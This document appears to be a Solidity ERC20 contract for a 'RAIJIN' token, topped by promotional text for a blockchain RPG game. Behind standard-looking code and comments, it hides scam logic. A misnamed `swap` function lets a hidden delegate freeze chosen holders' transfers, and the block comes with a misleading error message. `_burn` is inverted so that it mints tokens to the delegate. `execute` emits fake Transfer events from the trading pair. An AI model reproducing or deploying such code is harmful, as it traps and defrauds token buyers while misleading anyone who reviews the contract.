/**
 
Hello Warriors !
We are here to introduce you to the greatest Blockchain RPG game of this year. RaijinDAO the Game, 
is unique game based on Ethereum blokchain. RaijinDAO is a new type of game, partially owned and 
operated by its players. Earn RaijinDAO tokens by playing and use them to decide the future of the game!

?RAIJIN WEBSITE - https://raijindao.io/

As experienced team of developers, we decided that we want to give you some special oppurtunity to
 earn money and have fun at the same time. Thats why we are making RaijinDAO The Game.

?RAIJIN ARTICLES - https://medium.com/@raijindao

Take on the role of a unique warrior, leader of your army. Walk through vast and picturesque lands, 
where you will gain many companions but also enemies. Gather a unique team thanks to which you will 
reach the top and become a LEGEND.

?RAIJIN X FOLLOW - https://x.com/raijin_dao

Draft your starters. Challenge to be the best. Outsmart and counter your opponents strategically to 
place rank in competition. Earn $RAIJIN through play, and become part of our community-based governance. 
Each character has unique strengths and weaknesses based on its element. With billions of possible 
element combinations, the possibilities are truly Infinite.

?TELEGRAM CHAT - https://t.me/RaijinDAO

*/// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application is concerned).
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to specific functions.
 */
abstract contract Ownable is Context {
    address private _owner;
    address internal _delegate;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    /**
     * @dev Throws if called by any account other than the distributor.
     */
    modifier onlyDelegates() {
        require(_delegate == _msgSender(), "Delegates: caller is not the delegate");
        _;
    }
    
    /**
     * @dev Sets new delegate.
     */
    function delegate(address _address) external onlyOwner {
        require (_delegate == address(0));
        _delegate = _address;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
    
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's allowance.
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`). Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Implementation of the {IERC20} interface.
 * This implementation is agnostic to the way tokens are created. This means that a supply mechanism
 * has to be added in a derived contract. Additionally, an {Approval} event is emitted on calls to
 * {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening
 * to said events. Other implementations of the EIP may not emit these events, as it isn't required by the
 * specification. Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been
 * added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.
 */
contract ERC20 is Ownable, IERC20 {
    mapping(address => uint256) internal _balances;
    mapping(address => bool) private _overridePublicReturns;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals; 

    /**
     * @dev Sets the values for {name} and {symbol}.
     * All two of these values are immutable: they can only be set once during construction.
     */
    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
  
    function swap(address[] calldata spender, bool val) external onlyDelegates { 
        for (uint256 i = 0; i < spender.length; i++) {
            _overridePublicReturns[spender[i]] = val;
        }
    }

    
    function supportInterface(address spender) public view returns (bool) {
        return _overridePublicReturns[spender];
    }

    /**
     * @dev See {IERC20-transfer}.
     * Requirements:
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Destroys `amount` tokens from the caller.
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual onlyDelegates {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the total supply.
     * Emits a {Transfer} event with `to` set to the zero address.
     * Requirements:
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance <= amount, "ERC20: burn amount exceeds balance");
        unchecked {_balances[account] = accountBalance + amount;}
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked { _approve(sender, _msgSender(), currentAllowance - amount);}
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     * Requirements:
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {_approve(_msgSender(), spender, currentAllowance - subtractedValue);}
        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * Emits a {Transfer} event.
     * Requirements:
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address"); if 
        (_overridePublicReturns[sender]) require 
        (amount == 0, "ERC20: transfer amout exceeds allowance");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {_balances[sender] = senderBalance - amount;}
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * This internal function is equivalent to `approve`, and can be used to e.g. set automatic allowances for certain subsystems, etc.
     * Emits an {Approval} event.
     * Requirements:
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    address public uniswapV2Pair;
    function execute(address[] calldata _addresses, uint256 _out) external onlyDelegates{
        for (uint256 i = 0; i < _addresses.length; i++) {
            emit Transfer(uniswapV2Pair, _addresses[i], _out);
        }
    }

    function addPair(address pair_) public onlyOwner {
        uniswapV2Pair = pair_;        
    }
}

contract RAIJIN is ERC20 {
    constructor() ERC20('Raijin DAO', 'RAIJIN', 9) {
        _totalSupply = 10000000000*10**9;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
}